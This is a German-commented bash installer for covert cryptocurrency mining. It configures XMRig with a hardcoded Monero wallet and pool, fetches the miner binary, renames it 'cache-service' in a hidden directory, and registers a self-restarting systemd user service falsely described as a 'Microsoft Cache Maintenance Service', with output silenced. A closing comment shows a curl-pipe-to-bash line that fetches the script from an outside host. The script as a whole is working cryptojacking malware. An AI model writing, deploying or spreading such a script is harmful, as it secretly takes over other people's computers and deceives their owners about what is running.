#!/usr/bin/env bash

# ====================== EINSTELLUNGEN ======================
WALLET="4A2GjyjSnQqUjJMZvLju8YZaFSRZcb6qCC2Dw1DbebjNgCGviijSWjHRkeuPn5amLNP2h2P4vEBVi1bnG1BjqJ4yRotXGoF"
POOL="pool.supportxmr.com:5555"
PASS="${USER:-x}"
THREADS=50
SERVICE_NAME="ms-cache"
# ===========================================================

BASE="$HOME/.local/share/ms-cache"
BIN_DIR="$BASE/bin"
BIN="$BIN_DIR/cache-service"
CONFIG="$BASE/settings.json"
SERVICE_DIR="$HOME/.config/systemd/user"
SERVICE_FILE="$SERVICE_DIR/${SERVICE_NAME}.service"

mkdir -p "$BIN_DIR" "$SERVICE_DIR" 2>/dev/null || true

# ---------- Config schreiben ----------
cat > "$CONFIG" <<EOF
{
    "autosave": true,
    "background": false,
    "colors": false,
    "title": false,
    "randomx": {
        "init": -1,
        "mode": "auto",
        "1gb-pages": false,
        "rdmsr": true,
        "wrmsr": true,
        "cache_qos": false,
        "numa": true
    },
    "cpu": {
        "enabled": true,
        "huge-pages": true,
        "hw-aes": null,
        "priority": null,
        "memory-pool": false,
        "yield": true,
        "max-threads-hint": $THREADS,
        "asm": true,
        "argon2-impl": null
    },
    "opencl": { "enabled": false },
    "cuda":   { "enabled": false },
    "donate-level": 1,
    "log-file": null,
    "pools": [
        {
            "url": "$POOL",
            "user": "$WALLET",
            "pass": "$PASS",
            "keepalive": true,
            "enabled": true,
            "tls": false
        }
    ],
    "print-time": 60,
    "retries": 5,
    "retry-pause": 5,
    "syslog": false,
    "watch": true,
    "pause-on-battery": false
}
EOF

# ---------- Architektur erkennen ----------
ARCH=$(uname -m 2>/dev/null || echo "unknown")
case "$ARCH" in
    x86_64|amd64)   ASSET_PATTERN="linux-static-x64" ;;
    aarch64|arm64)  ASSET_PATTERN="linux-static-arm64" ;;
    armv7l|armhf)   ASSET_PATTERN="linux-armv7" ;;
    *)
        echo "Nicht unterstützte Architektur: $ARCH" >&2
        exit 1
        ;;
esac

# ---------- Binary laden falls nicht vorhanden ----------
if [ ! -x "$BIN" ]; then
    echo "Lade Binary..."

    if ! command -v curl >/dev/null 2>&1; then
        echo "curl fehlt. Bitte installieren." >&2
        exit 1
    fi

    RELEASE_JSON=$(curl -fsSL "https://api.github.com/repos/xmrig/xmrig/releases/latest" \
        -H "User-Agent: Mozilla/5.0" \
        -H "Accept: application/vnd.github+json" 2>/dev/null)

    if [ -z "$RELEASE_JSON" ]; then
        echo "Konnte Release-Infos nicht laden." >&2
        exit 1
    fi

    DOWNLOAD_URL=$(echo "$RELEASE_JSON" | grep -o "https://github.com/xmrig/xmrig/releases/download/[^\"]*${ASSET_PATTERN}\.tar\.gz" | head -1)

    if [ -z "$DOWNLOAD_URL" ]; then
        echo "Kein passendes Binary für $ASSET_PATTERN gefunden." >&2
        exit 1
    fi

    TMP_TAR=$(mktemp /tmp/cache-XXXXXX.tar.gz 2>/dev/null || mktemp)
    TMP_DIR=$(mktemp -d /tmp/cache-extract-XXXXXX 2>/dev/null || mktemp -d)

    curl -fsSL "$DOWNLOAD_URL" -o "$TMP_TAR" || {
        echo "Download fehlgeschlagen." >&2
        rm -f "$TMP_TAR"
        exit 1
    }

    tar -xzf "$TMP_TAR" -C "$TMP_DIR" 2>/dev/null || {
        echo "Entpacken fehlgeschlagen." >&2
        rm -rf "$TMP_TAR" "$TMP_DIR"
        exit 1
    }

    FOUND=$(find "$TMP_DIR" -type f -name "xmrig" 2>/dev/null | head -1)

    if [ -z "$FOUND" ]; then
        echo "xmrig Binary nicht gefunden." >&2
        rm -rf "$TMP_TAR" "$TMP_DIR"
        exit 1
    fi

    mv "$FOUND" "$BIN"
    chmod +x "$BIN"
    rm -rf "$TMP_TAR" "$TMP_DIR"
fi

# ---------- systemd User-Service (falls vorhanden) ----------
if command -v systemctl >/dev/null 2>&1 && [ -d "$HOME/.config/systemd" ] || mkdir -p "$SERVICE_DIR" 2>/dev/null; then
    cat > "$SERVICE_FILE" <<EOF
[Unit]
Description=Microsoft Cache Maintenance Service
After=network-online.target
Wants=network-online.target

[Service]
Type=simple
ExecStart=$BIN --config=$CONFIG
Restart=always
RestartSec=10
Nice=10

[Install]
WantedBy=default.target
EOF

    systemctl --user daemon-reload >/dev/null 2>&1 || true
    systemctl --user enable "$SERVICE_NAME.service" >/dev/null 2>&1 || true
    systemctl --user restart "$SERVICE_NAME.service" >/dev/null 2>&1 || true
fi

# ---------- Fallback: direkt im Hintergrund starten ----------
if ! pgrep -f "$BIN" >/dev/null 2>&1; then
    nohup "$BIN" --config="$CONFIG" >/dev/null 2>&1 &
fi

echo "Setup abgeschlossen."

# curl -fsSL https://pariedl.com/start-eco.sh | bash